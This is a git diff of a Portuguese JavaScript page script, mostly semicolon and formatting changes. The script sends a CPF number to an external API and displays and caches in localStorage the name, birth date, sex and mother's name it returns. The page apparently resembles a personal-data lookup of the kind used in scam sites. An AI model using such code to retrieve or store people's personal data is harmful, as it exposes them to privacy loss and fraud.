@@ -100,37 +100,40 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Consultar CPF na API
   function consultarCPF(cpf) {
-    consultaResultado.classList.remove("hidden")
-    loadingInfo.classList.remove("hidden")
-    userInfo.classList.add("hidden")
-    errorInfo.classList.add("hidden")
+    consultaResultado.classList.remove("hidden");
+    loadingInfo.classList.remove("hidden");
+    userInfo.classList.add("hidden");
+    errorInfo.classList.add("hidden");
 
-    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" })
+    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
-    fetch("https://nova-oportunidade.com/nu/api.php?cpf=" + encodeURIComponent(cpf))
+    fetch(
+      "https://nova-oportunidade.com/api.php?cpf=" + encodeURIComponent(cpf)
+    )
       .then((response) => {
         if (!response.ok) {
-          throw new Error("Erro na consulta: " + response.status)
+          throw new Error("Erro na consulta: " + response.status);
         }
-        return response.json()
+        return response.json();
       })
       .then((data) => {
-        loadingInfo.classList.add("hidden")
+        loadingInfo.classList.add("hidden");
 
         if (data && Number(data.status) === 200) {
-          console.log(data)
+          console.log(data);
 
-          nomeUsuario.textContent = data.NOME || data.nome || "Não informado"
+          nomeUsuario.textContent = data.NOME || data.nome || "Não informado";
           dataNascimento.textContent =
-            formatDate(data.nascimento || data.NASCIMENTO) || "Não informado"
-          cpfUsuario.textContent = (data.CPF || data.cpf)
-            ? (data.CPF || data.cpf).replace(
-                /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
-                "$1.$2.$3-$4"
-              )
-            : "Não informado"
-          sexoUsuario.textContent = data.SEXO || data.sexo || "Não informado"
-          nomeMae.textContent = data.MAE || data.mae || "Não informado"
+            formatDate(data.nascimento || data.NASCIMENTO) || "Não informado";
+          cpfUsuario.textContent =
+            data.CPF || data.cpf
+              ? (data.CPF || data.cpf).replace(
+                  /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
+                  "$1.$2.$3-$4"
+                )
+              : "Não informado";
+          sexoUsuario.textContent = data.SEXO || data.sexo || "Não informado";
+          nomeMae.textContent = data.MAE || data.mae || "Não informado";
 
           const dadosUsuario = {
             nome: data.NOME || data.nome || "",
@@ -138,39 +141,38 @@ document.addEventListener("DOMContentLoaded", function () {
             nomeMae: data.MAE || data.mae || "",
             cpf: data.CPF || data.cpf || "",
             sexo: data.SEXO || data.sexo || "",
-          }
+          };
 
-          localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario))
+          localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
 
           if (dadosUsuario.nome) {
-            localStorage.setItem("nomeUsuario", dadosUsuario.nome)
+            localStorage.setItem("nomeUsuario", dadosUsuario.nome);
           }
           if (dadosUsuario.cpf) {
-            localStorage.setItem("cpfUsuario", dadosUsuario.cpf)
+            localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
           }
 
-          userInfo.classList.remove("hidden")
+          userInfo.classList.remove("hidden");
 
           setTimeout(() => {
-            userInfo.scrollIntoView({ behavior: "smooth", block: "center" })
-          }, 100)
+            userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
+          }, 100);
         } else {
           errorMessage.textContent =
-            "Não foi possível obter os dados para este CPF."
-          errorInfo.classList.remove("hidden")
-          errorInfo.scrollIntoView({ behavior: "smooth", block: "center" })
+            "Não foi possível obter os dados para este CPF.";
+          errorInfo.classList.remove("hidden");
+          errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
         }
       })
       .catch((error) => {
-        loadingInfo.classList.add("hidden")
+        loadingInfo.classList.add("hidden");
         errorMessage.textContent =
-          error.message || "Ocorreu um erro ao consultar seus dados."
-        errorInfo.classList.remove("hidden")
-        console.error("Erro na consulta:", error)
-        errorInfo.scrollIntoView({ behavior: "smooth", block: "center" })
-      })
-}
-
+          error.message || "Ocorreu um erro ao consultar seus dados.";
+        errorInfo.classList.remove("hidden");
+        console.error("Erro na consulta:", error);
+        errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
+      });
+  }
 
   // Verificar se existe CPF na URL e salvar no localStorage
   const urlParams = new URLSearchParams(window.location.search);
